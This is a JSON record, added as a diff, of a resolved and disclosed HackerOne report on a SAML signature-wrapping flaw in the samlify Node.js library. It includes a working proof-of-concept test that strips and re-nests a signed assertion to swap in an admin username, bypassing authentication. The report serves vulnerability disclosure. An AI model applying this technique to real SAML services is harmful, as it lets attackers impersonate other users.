@@ -1,0 +1,132 @@
+{
+  "id": 356284,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTYyODQ=",
+  "url": "https://hackerone.com/reports/356284",
+  "title": "Samlify is vulnerable to signature wrapping",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-23T07:11:09.848Z",
+  "submitted_at": "2018-05-23T07:11:09.848Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "webtonull",
+    "url": "/webtonull",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-23T07:54:50.161Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-10-02T07:03:29.905Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a signature wrapping weakness in samlify\nIt allows an attacker to modify a SAML token received from the IdP before validating it with the service provider\n\n# Module\n\n**module name:** samlify\n**version:** 2.3.7\n**npm page:** `https://www.npmjs.com/package/samlify`\n\n## Module Description\n\nHighly configuarable Node.js SAML 2.0 library for Single Sign On\n\n## Module Stats\n\n> Replace stats below with numbers from npm’s module page:\n\n1084 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nIt's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.\n\n## Steps To Reproduce:\n\nClone the github repo, put this in `test/flow.ts` and run `npm run test`:\n```\n\ntest('should reject signature wrapped response', async t => {\n  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)\n  const user = { email: 'user@esaml2.com' };\n  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));\n  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)\n\n  //Decode\n  var buffer = new Buffer(SAMLResponse, \"base64\");\n  var xml = buffer.toString();\n  //Create version of response without signature\n  var stripped = xml\n    .replace(/<ds:Signature[\\s\\S]*ds:Signature>/, \"\");\n  //Create version of response with altered IDs and new username\n  var outer = xml\n    .replace(/assertion\" ID=\"_[0-9a-f]{3}/g, 'assertion\" ID=\"_000')\n    .replace(\"user@esaml2.com\", \"admin@esaml2.com\");\n  //Put stripped version under SubjectConfirmationData of modified version\n  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\\/>/, \"<saml:SubjectConfirmationData>\" + stripped.replace('<?xml version=\"1.0\" encoding=\"UTF-8\"?>', \"\") + \"</saml:SubjectConfirmationData>\");\n  const wrappedResponse = new Buffer(xmlWrapped).toString(\"base64\");\n\n  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });\n  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));\n  //This tampering goes undetected....and only fails because there are now two names\n  t.is(extract.nameid, 'user@esaml2.com');\n});\r\n```\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- Ubuntu 16.04\n- v7.4.0\n- 6.0.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nI will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.\n\n## Impact\n\nAuthentication bypass",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-11-01T07:03:29.972Z",
+  "allow_singular_disclosure_after": -237284800.2059223,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "ali",
+    "sameerphad72",
+    "eveeez",
+    "cryptographer",
+    "ramseyy",
+    "jamyboy",
+    "pofargst"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 14636,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "samlify",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
